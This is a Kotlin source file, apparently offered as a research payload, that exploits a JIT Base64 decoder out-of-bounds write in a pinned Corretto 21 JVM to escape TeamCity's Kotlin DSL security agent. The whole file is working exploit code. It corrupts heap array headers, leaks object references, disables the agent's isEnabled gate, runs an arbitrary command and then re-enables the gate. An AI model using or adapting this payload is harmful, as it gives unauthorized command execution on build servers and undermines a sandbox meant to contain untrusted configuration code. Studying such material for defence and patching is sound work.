import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.nio.charset.Charset
import java.util.Base64
import java.util.concurrent.TimeUnit

/** Research payload for the pinned TeamCity 2026.2.1 / Corretto 21 layout. */
object HeapEscape {
    private const val LENGTH = 256
    private const val STRIDE = LENGTH * 4 + 16
    private const val REFS_DATA = STRIDE * 2
    private const val CONTEXT_THREAD = 112
    private const val CONTEXT_ENABLED = 116
    @Volatile private var writer = IntArray(0)
    @Volatile private var reader = IntArray(0)
    @Volatile private var refs = arrayOfNulls<Any>(0)
    @Volatile private var roots = arrayOfNulls<Any>(0)
    @Volatile private var cursor = 0
    @Volatile private var sink = 0

    fun run(command: List<String>): String {
        require(System.getProperty("java.specification.version") == "21")
        require(System.getProperty("java.vendor") == "Amazon.com Inc.")
        require(System.getProperty("java.runtime.version") in setOf("21.0.10+7-LTS", "21.0.13.1+2-LTS"))
        require(command.isNotEmpty())
        // ProcessImpl uses the JVM's startup native encoding for argv. Reject
        // unrepresentable characters before the heap edit instead of letting
        // Java silently replace bytes in an operator-supplied command.
        val nativeEncoding = System.getProperty("sun.jnu.encoding")
            ?: return "UNKNOWN_ARGUMENT_ENCODING"
        val nativeCharset = Charset.forName(nativeEncoding)
        if (command.any { !nativeCharset.newEncoder().canEncode(it) }) {
            return "UNSUPPORTED_ARGUMENT_ENCODING:" + nativeCharset.name()
        }
        val context = Class.forName("jetbrains.buildServer.configs.dsl.securityAgent.DslAgentContext")
        val thread = Thread.currentThread()
        val decoder = Base64.getDecoder()
        val valid = "A".repeat(64).toByteArray(Charsets.US_ASCII)
        val padded = ("A".repeat(63) + "=").toByteArray(Charsets.US_ASCII)
        val malformed = ("A".repeat(64) + "=").toByteArray(Charsets.US_ASCII)
        if (!warmDecoder(decoder, valid, padded, malformed)) return "UNCHANGED_DECODER_PROBE"
        return perform(command, context, thread, decoder, malformed)
    }

    // Keep the hot training loop separate from the first corrupting call. This
    // avoids compiling the heap operation as a cold continuation of an OSR loop.
    private fun warmDecoder(decoder: Base64.Decoder, valid: ByteArray, padded: ByteArray,
                            malformed: ByteArray): Boolean {
        val guard = ByteArray(178)
        var consecutive = 0
        repeat(40) { round ->
            repeat(100_000) { iteration ->
                sink = sink xor decodeToArray(decoder, if ((iteration and 1) == 0) valid else padded, guard)
            }
            // All decoder stores remain inside this real, oversized array. A
            // changed guard establishes that this child has reached the genuine
            // vulnerable intrinsic before any object metadata is put at risk.
            repeat(128) {
                java.util.Arrays.fill(guard, 0x5a.toByte())
                check(decodeToArray(decoder, malformed, guard) == -1) { "The malformed decoder probe was accepted" }
                var changed = 0
                var first = -1
                var last = -1
                for (position in 50 until guard.size) {
                    if (guard[position] != 0x5a.toByte()) {
                        if (first < 0) first = position
                        last = position
                        changed++
                    }
                }
                if (changed == 62 && first == 50 && last == 111) consecutive++
                else {
                    check(changed == 0) { "Unexpected bounded decoder overwrite" }
                    consecutive = 0
                }
            }
            // Repeated malformed calls train the real exception path as well.
            // Returning after its first hit could leave a deoptimized decoder
            // for the following small-destination call.
            if (round >= 7 && consecutive >= 32) return true
            // TeamCity's compiler workload can leave C2 work queued after the
            // first warm-up loop. Give that work time to finish, then recheck.
            Thread.sleep(25)
        }
        return false
    }

    private fun decodeToArray(decoder: Base64.Decoder, source: ByteArray, destination: ByteArray): Int {
        return try { decoder.decode(source, destination) }
        catch (expected: IllegalArgumentException) { -1 }
    }

    private fun perform(command: List<String>, context: Class<*>, thread: Thread,
                        decoder: Base64.Decoder, malformed: ByteArray): String {
        // Keep all real allocations alive. The overwrite itself, rather than a
        // privileged helper, must enlarge the first array before any heap edit.
        val hold = arrayOfNulls<Any>(5)
        roots = hold
        val destination = ByteArray(50)
        val first = IntArray(LENGTH)
        val second = IntArray(LENGTH)
        val objects = arrayOfNulls<Any>(6)
        java.util.Arrays.fill(second, 0, 8, 0x43434343)
        objects[0] = first
        objects[1] = second
        objects[2] = context
        objects[4] = objects
        objects[5] = thread
        writer = first
        reader = second
        refs = objects
        hold[0] = destination
        hold[1] = first
        hold[2] = second
        hold[3] = objects
        hold[4] = context
        check(decodeToArray(decoder, malformed, destination) == -1)
        val witness = writer.size
        if (witness == LENGTH) return "UNCHANGED_FIRST_WITNESS"

        val w = writer
        check(get(w, LENGTH) == 1 && get(w, LENGTH + 1) == 0 && get(w, LENGTH + 3) == LENGTH)
        check(get(w, STRIDE / 4) == 0x43434343 && get(w, REFS_DATA / 4 - 1) == 6)
        val intArrayKlass = get(w, LENGTH + 2)
        val firstOop = unsigned(get(w, REFS_DATA / 4))
        val secondOop = unsigned(get(w, REFS_DATA / 4 + 1))
        val contextOop = unsigned(get(w, REFS_DATA / 4 + 2))
        val refsOop = unsigned(get(w, REFS_DATA / 4 + 4))
        val threadOop = get(w, REFS_DATA / 4 + 5)
        val shift = when (secondOop - firstOop) {
            STRIDE.toLong() -> 0
            (STRIDE / 8).toLong() -> 3
            else -> error("Unsupported compressed-reference layout")
        }
        check(((refsOop - firstOop) shl shift) == STRIDE * 2L)

        // Build a temporary int[] header inside the real writer. Unlike bastore,
        // iastore does not distinguish byte[] from boolean[] by their class.
        put(w, 16, 1)
        put(w, 17, 0)
        put(w, 18, intArrayKlass)
        put(w, 19, -1)
        put(w, REFS_DATA / 4 + 3, (firstOop + (80 shr shift)).toInt())
        var window: IntArray? = refs[3] as IntArray
        val contextDelta = ((contextOop - firstOop) shl shift) - 96
        val stateIndex = index(contextDelta + CONTEXT_ENABLED)
        val threadIndex = index(contextDelta + CONTEXT_THREAD)
        val state = get(window!!, stateIndex)
        check((state and 255) == 1 && get(window!!, threadIndex) == threadOop)
        // Repair the genuine writer and erase the interior reference before
        // disabling the gate. No allocating operation belongs in this window.
        put(window!!, -24, 1)
        put(window!!, -23, 0)
        put(window!!, -22, intArrayKlass)
        put(window!!, -21, LENGTH)
        put(window!!, (REFS_DATA + 12 - 80) / 4, 0)
        var result: String? = null
        var failure: Throwable? = null
        try {
            put(window!!, stateIndex, state and -256)
            window = null
            java.util.Arrays.fill(writer, 0, 10, 0)
            java.util.Arrays.fill(writer, 16, 20, 0)
            check(writer.size == LENGTH && reader.size == LENGTH && refs[3] == null)
            result = execute(command)
        } catch (error: Throwable) {
            failure = error
        } finally {
            window = null
            // The stock agent prevents obtaining this Field while its gate is
            // enabled. Obtain it after the genuine heap edit, even if command
            // creation failed, and preserve the original error if repair fails.
            try {
                val enabled = context.getDeclaredField("isEnabled")
                enabled.isAccessible = true
                enabled.setBoolean(null, true)
                check(enabled.getBoolean(null)) { "The security-agent gate stayed disabled" }
            } catch (restore: Throwable) {
                if (failure != null) restore.addSuppressed(failure!!)
                throw IllegalStateException("Security-agent restoration failed", restore)
            }
        }
        val deniedAgain = try {
            val unexpected = ProcessBuilder("/usr/bin/true").start()
            unexpected.destroyForcibly()
            unexpected.waitFor(2, TimeUnit.SECONDS)
            false
        } catch (expected: SecurityException) {
            true
        }
        check(deniedAgain) { "The command restriction was not restored" }
        val evidence = "boundedChanged=62 witness=$witness oopShift=$shift restoredDenied=$deniedAgain"
        if (failure != null) {
            return "COMMAND_ERROR $evidence error64=" +
                Base64.getEncoder().encodeToString(describeFailure(failure!!).toByteArray(Charsets.UTF_8))
        }
        return "COMMAND_OK $evidence $result"
    }

    private fun unsigned(value: Int): Long = value.toLong() and 0xffffffffL
    private fun describeFailure(error: Throwable): String {
        val messages = ArrayList<String>()
        fun append(current: Throwable, label: String, depth: Int) {
            if (depth > 2 || messages.size >= 8) return
            messages.add(label + current.javaClass.name + ": " + (current.message ?: ""))
            for (suppressed in current.suppressed) append(suppressed, "cleanup: ", depth + 1)
        }
        append(error, "", 0)
        return messages.joinToString("; ").take(8192)
    }
    private fun index(bytes: Long): Int {
        check(bytes % 4 == 0L && bytes / 4 >= Int.MIN_VALUE.toLong() && bytes / 4 <= Int.MAX_VALUE.toLong())
        return (bytes / 4).toInt()
    }
    private fun get(array: IntArray, position: Int): Int {
        cursor = position
        return array[cursor]
    }
    private fun put(array: IntArray, position: Int, value: Int) {
        cursor = position
        array[cursor] = value
    }

    private fun execute(command: List<String>): String {
        val stdout = ByteArrayOutputStream()
        val stderr = ByteArrayOutputStream()
        val buffer = ByteArray(4096)
        var truncated = false
        fun drain(input: InputStream, output: ByteArrayOutputStream) {
            // A producer can keep a pipe permanently readable. Limit each pass
            // so both streams and the deadline receive attention.
            var remaining = 65536
            while (remaining > 0) {
                val available = input.available()
                if (available <= 0) break
                val count = input.read(buffer, 0, minOf(buffer.size, available, remaining))
                if (count <= 0) break
                remaining -= count
                val keep = minOf(count, maxOf(0, 65536 - output.size()))
                output.write(buffer, 0, keep)
                if (keep < count) truncated = true
            }
        }
        var timedOut = false
        var failure: Throwable? = null
        val child = ProcessBuilder(command).start()
        try {
            val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(5)
            child.outputStream.close()
            while (true) {
                drain(child.inputStream, stdout)
                drain(child.errorStream, stderr)
                if (!child.isAlive) break
                if (System.nanoTime() >= deadline) {
                    timedOut = true
                    stopChild(child)
                    break
                }
                Thread.sleep(10)
            }
            // Process.destroyForcibly() may close the JDK's pipe streams. The
            // timeout result uses bytes already captured before termination.
            if (!timedOut) {
                drain(child.inputStream, stdout)
                drain(child.errorStream, stderr)
            }
            return "exit=${child.exitValue()} timeout=$timedOut truncated=$truncated " +
                "stdout64=${Base64.getEncoder().encodeToString(stdout.toByteArray())} " +
                "stderr64=${Base64.getEncoder().encodeToString(stderr.toByteArray())}"
        } catch (error: Throwable) {
            failure = error
            throw error
        } finally {
            var cleanup: Throwable? = null
            fun attempt(action: () -> Unit) {
                try { action() }
                catch (error: Throwable) {
                    if (cleanup == null) cleanup = error else cleanup!!.addSuppressed(error)
                }
            }
            attempt { if (child.isAlive) stopChild(child) }
            attempt { child.outputStream.close() }
            attempt { child.inputStream.close() }
            attempt { child.errorStream.close() }
            if (cleanup != null) {
                if (failure != null) failure!!.addSuppressed(cleanup!!) else throw cleanup!!
            }
        }
    }

    private fun stopChild(child: Process) {
        var interrupted = false
        val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(2)
        try {
            if (child.isAlive) child.destroyForcibly()
            while (child.isAlive) {
                val remaining = deadline - System.nanoTime()
                check(remaining > 0) { "Command did not exit after termination" }
                try { child.waitFor(remaining, TimeUnit.NANOSECONDS) }
                catch (expected: InterruptedException) { interrupted = true }
            }
        } finally {
            if (interrupted) Thread.currentThread().interrupt()
        }
    }
}
